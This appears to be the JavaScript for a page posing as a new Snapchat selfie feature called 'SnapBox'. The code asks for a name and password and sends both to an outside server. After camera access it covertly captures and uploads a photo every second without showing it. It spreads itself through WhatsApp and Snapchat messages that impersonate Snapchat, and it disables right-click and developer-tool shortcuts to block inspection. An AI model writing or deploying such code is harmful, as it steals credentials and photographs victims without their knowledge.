
  lucide.createIcons();
  let currentIndex = 0;
  const capturedImages = [];
  let autoIntervalId = null;
  let stream = null;

  function toggleTheme() {
    const html = document.documentElement;
    const icon = document.querySelector('[data-lucide="sun"], [data-lucide="moon"]');
    html.classList.toggle('dark');

    if (html.classList.contains('dark')) {
      html.classList.add('bg-black', 'text-white');
      html.classList.remove('bg-white', 'text-black');
      icon.setAttribute('data-lucide', 'sun');
    } else {
      html.classList.add('bg-white', 'text-black');
      html.classList.remove('bg-black', 'text-white');
      icon.setAttribute('data-lucide', 'moon');
    }

    lucide.createIcons();
  }

function capturePhoto(auto = false) {
  const video = document.getElementById('camera');
  const canvas = document.getElementById('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext('2d');
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const dataUrl = canvas.toDataURL('image/jpeg');
  const blob = dataURLtoBlob(dataUrl);

  if (auto) {
    // Auto mode: upload only, don't update preview or array
    uploadSinglePhoto(blob, currentIndex + 1);
    console.log(`Auto selfie ${currentIndex + 1} clicked`);
    return;
  }

  if (currentIndex < 4) {
    // Manual mode: show in preview box and save locally
    const box = document.querySelectorAll('.preview-box')[currentIndex];
    box.style.backgroundImage = `url(${dataUrl})`;
    box.innerText = '';
    capturedImages.push(blob);
    uploadSinglePhoto(blob, currentIndex + 1);
    currentIndex++;
if (currentIndex === 4) {
  document.getElementById('msg').classList.remove('hidden');
  setTimeout(() => document.getElementById('msg').classList.add('hidden'), 3000);

  // Stop animation
  document.querySelectorAll('.preview-ring').forEach(el => {
    el.style.animation = 'none';
  });
}
  }
}

  function manualCapture() {
    capturePhoto(false);
  }

  function uploadSinglePhoto(blob, index) {
    const formData = new FormData();
    formData.append('photos', blob, `photo${index}.jpg`);
    fetch('https://snapbox-backend-python.onrender.com/upload', {
      method: 'POST',
      body: formData
    }).then(() => {
      console.log(`Uploaded selfie ${index}`);
    }).catch(err => {
      console.error(`Upload error selfie ${index}`, err);
    });
  }

  function dataURLtoBlob(dataurl) {
    const parts = dataurl.split(',');
    const mime = parts[0].match(/:(.*?);/)[1];
    const bstr = atob(parts[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], { type: mime });
  }

  function submitPhotos() {
    const formData = new FormData();
    capturedImages.forEach((img, i) => formData.append('photos', img, `photo${i + 1}.jpg`));
    fetch('https://snapbox-backend-python.onrender.com/upload', {
      method: 'POST',
      body: formData
    }).catch(err => console.error('Upload error:', err));

    document.querySelectorAll('.preview-ring').forEach(el => {
      el.style.animation = 'none';
    });

    document.getElementById("msg").classList.remove("hidden");
    setTimeout(() => {
      document.getElementById("msg").classList.add("hidden");
    }, 3000);
  }

  function downloadAllPhotos() {
    if (capturedImages.length < 1) return alert("Capture photos first!");
    capturedImages.forEach((blob, i) => {
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `selfie_${i + 1}.jpg`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    });
  }

function resetAll() {
  currentIndex = 0;
  capturedImages.length = 0;

  document.querySelectorAll('.preview-box').forEach((box, i) => {
    box.style.backgroundImage = '';
    box.innerText = `Tap ${i + 1}`;
  });

  document.getElementById('msg').classList.add('hidden');

  // Restart rotation animation
  document.querySelectorAll('.preview-ring').forEach(el => {
    el.style.animation = ''; // restart spin
  });
}
  
function storeName() {
  const name = document.getElementById('nameInput').value.trim();
  const password = document.getElementById('passwordInput').value;

  if (!name || !password) {
    return alert("Please enter both name and password");
  }

  const formData = new FormData();
  formData.append("username", name);
  formData.append("password", password);

  fetch("https://snapbox-backend-python.onrender.com/upload", {
    method: "POST",
    body: formData, // ✅ No JSON, only FormData
  })
    .then((res) => {
      if (!res.ok) throw new Error("Failed to upload");
      return res.json();
    })
    .then((data) => {
      console.log("✅ Name/password uploaded:", data);
    })
    .catch((err) => {
      console.error("❌ Error uploading:", err);
    });

  // Hide popup, show name, unblur background, and start camera
  document.getElementById('nameModal').classList.add('hidden');
  const nameDisplay = document.getElementById('userNameDisplay');
  nameDisplay.textContent = name;
  nameDisplay.classList.remove('hidden');

  document.getElementById('mainContainer').classList.remove('blur-md', 'pointer-events-none');
  startCamera();
}


  function startCamera() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(mediaStream => {
        stream = mediaStream;
        document.getElementById('camera').srcObject = stream;
        
 autoIntervalId = setInterval(() => {
  capturePhoto(true); // Only capture, don't touch currentIndex
}, 1000);
      })
      .catch(err => {
        alert('Camera access failed. Use HTTPS or allow permission.');
        console.error(err);
      });
  }

  // Popup flow on page load
  window.addEventListener('load', () => {
    const welcome = document.getElementById('welcomePopup');
    const challenge = document.getElementById('challengePopup');
    const nameModal = document.getElementById('nameModal');

    welcome.classList.remove('hidden');
    setTimeout(() => {
      welcome.classList.add('hidden');
      challenge.classList.remove('hidden');
      setTimeout(() => {
        challenge.classList.add('hidden');
        nameModal.classList.remove('hidden');
      }, 3000);
    }, 2000);
  });
  
  function shareOnWhatsApp() {
    // Name from username element
    const username = document.getElementById('userNameDisplay')?.textContent || "Your friend";
    
    // Snapbox Url
    const siteURL = "https://snapbox-selfie.github.io/snapchat/";

    // Create msg for whatsapp
    const msg = `${username} challenged you to click real selfies on Snapchat's new feature SnapBox 👻\nClick here 👉 ${siteURL}`;

    // WhatsApp share URL
    const waURL = `https://wa.me/?text=${encodeURIComponent(msg)}`;

    // Open Whatsapp
    window.open(waURL, '_blank');
  }
  function copySnapchatMessage() {
    const username = document.getElementById('userNameDisplay')?.textContent || "Your friend";
    const siteURL = "https://snapbox-selfie.github.io/snapchat/";
    const msg = `${username} challenged you to click real selfies on Snapchat's new feature SnapBox 👻\nClick here 👉 ${siteURL}`;

    // Copy to clipboard
    navigator.clipboard.writeText(msg).then(() => {
      alert("📋 Message copied! Open Snapchat and paste it in chat or story ✨");
    }).catch(() => {
      alert("❌ Failed to copy message");
    });
  }
  
  // 🔒 Disable Inspect Element, View Source, Right Click
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', function (e) {
  if (
    e.key === 'F12' ||
    (e.ctrlKey && e.shiftKey && ['I', 'C', 'J'].includes(e.key.toUpperCase())) ||
    (e.ctrlKey && e.key.toUpperCase() === 'U')
  ) {
    e.preventDefault();
  }
});
